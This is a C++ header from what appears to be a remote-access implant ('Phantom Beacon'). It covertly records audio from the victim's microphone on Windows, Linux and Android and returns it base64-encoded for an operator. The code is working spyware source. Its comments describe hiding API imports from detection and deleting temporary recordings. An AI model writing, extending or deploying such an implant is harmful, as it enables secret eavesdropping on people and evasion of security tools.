#pragma once
// ============================================================================
//  audio.h — Phantom Beacon Audio Recording Module (Cross-Platform)
//  ─────────────────────────────────────────────────────
//  Records audio for a specified duration:
//  Windows: PowerShell SoundRecorder / WASAPI loopback
//  Linux:   arecord / ffmpeg / sox
//  Android: termux-microphone-recorder / arecord
// ============================================================================

#include "media_utils.h"
#include <string>
#include <cstdlib>
#ifdef _WIN32
#include "wasapi_capture.h"
#endif

namespace media_audio {

inline std::string record_audio(int duration_seconds) {
    if (duration_seconds <= 0) duration_seconds = 5;

#ifdef _WIN32
    // ── Native WASAPI capture: no external tools, no powershell ─────────
    // The old path used System.Media.SoundRecorder — a .NET type that does
    // not exist on modern Windows — so `audio` always failed silently.
    // wasapi_capture.h talks to the mic through raw COM vtable slots
    // (no <audioclient.h>, no audio-API import trace).
    std::string tmp_file = media_utils::join_path(media_utils::get_temp_path(),
                                                  "phantom_audio.wav");
    {
        int rc = wasapi::capture(duration_seconds, tmp_file.c_str());
        if (rc == wasapi::OK && media_utils::file_exists(tmp_file)) {
            std::string b64 = media_utils::read_file_b64(tmp_file);
            DeleteFileA(tmp_file.c_str());
            if (!b64.empty()) return b64;
        }
        if (rc != wasapi::E_COM) {
            // WASAPI answered but capture failed (no mic, privacy block,
            // muted device): report the precise reason to the operator.
            const char* why = "unknown";
            switch (rc) {
                case wasapi::E_ENUM:     why = "no capture device";      break;
                case wasapi::E_ACTIVATE: why = "IAudioClient activate";  break;
                case wasapi::E_INIT:     why = "stream init (mic blocked?)"; break;
                case wasapi::E_SERVICE:  why = "capture service";        break;
                case wasapi::E_NODATA:   why = "no data in window";      break;
                case wasapi::E_WRITE:    why = "temp file write";        break;
            }
            return std::string("AUDIO_ERROR: WASAPI ") + why + "\n";
        }
        // E_COM → fall through to legacy path (server-core sessions etc.)
    }

    return "AUDIO_ERROR: No audio recorder available (WASAPI unavailable)\n";

#elif defined(__ANDROID__) || defined(ANDROID)
    // Android: try termux-microphone-recorder
    std::string termux = media_utils::exec_cmd("which termux-microphone-recorder 2>/dev/null");
    if (!termux.empty()) {
        std::string cmd = "termux-microphone-recorder -d " + std::to_string(duration_seconds) + " 2>&1";
        std::string result = media_utils::exec_cmd(cmd);
        if (result.find("Recording") != std::string::npos) {
            std::string files = media_utils::exec_cmd("ls -t /data/data/com.termux/files/home/storage/shared/microphone/*.3gp 2>/dev/null | head -1");
            if (!files.empty()) {
                return media_utils::read_file_b64(files);
            }
        }
    }

    // Fallback: arecord
    std::string arecord = media_utils::exec_cmd("which arecord 2>/dev/null");
    if (!arecord.empty()) {
        std::string tmp_file = "/data/local/tmp/phantom_audio.wav";
        std::string cmd = "arecord -D hw:0,0 -f cd -d " + std::to_string(duration_seconds) + " " + tmp_file + " 2>/dev/null";
        int ret = system(cmd.c_str());
        if (ret == 0 && media_utils::file_exists(tmp_file)) {
            return media_utils::read_file_b64(tmp_file);
        }
    }

    return "AUDIO_ERROR: No audio recorder available (termux-microphone-recorder or arecord)\n";

#else
    // Linux: try arecord, ffmpeg, sox
    std::string tmp_file = media_utils::join_path(media_utils::get_temp_path(), "phantom_audio.wav");

    // Method 1: arecord
    std::string arecord = media_utils::exec_cmd("which arecord 2>/dev/null");
    if (!arecord.empty()) {
        std::string cmd = "arecord -D default -f cd -d " + std::to_string(duration_seconds) + " " + tmp_file + " 2>/dev/null";
        int ret = system(cmd.c_str());
        if (ret == 0 && media_utils::file_exists(tmp_file)) {
            return media_utils::read_file_b64(tmp_file);
        }
    }

    // Method 2: ffmpeg
    std::string ffmpeg = media_utils::exec_cmd("which ffmpeg 2>/dev/null");
    if (!ffmpeg.empty()) {
        std::string cmd = "ffmpeg -f alsa -i default -t " + std::to_string(duration_seconds) + " -y " + tmp_file + " 2>/dev/null";
        int ret = system(cmd.c_str());
        if (ret == 0 && media_utils::file_exists(tmp_file)) {
            return media_utils::read_file_b64(tmp_file);
        }
    }

    // Method 3: sox/rec
    std::string sox = media_utils::exec_cmd("which rec 2>/dev/null");
    if (!sox.empty()) {
        std::string cmd = "rec -d " + tmp_file + " " + std::to_string(duration_seconds) + " 2>/dev/null";
        int ret = system(cmd.c_str());
        if (ret == 0 && media_utils::file_exists(tmp_file)) {
            return media_utils::read_file_b64(tmp_file);
        }
    }

    return "AUDIO_ERROR: No audio recorder available (arecord, ffmpeg, or sox)\n";
#endif
}

} // namespace media_audio
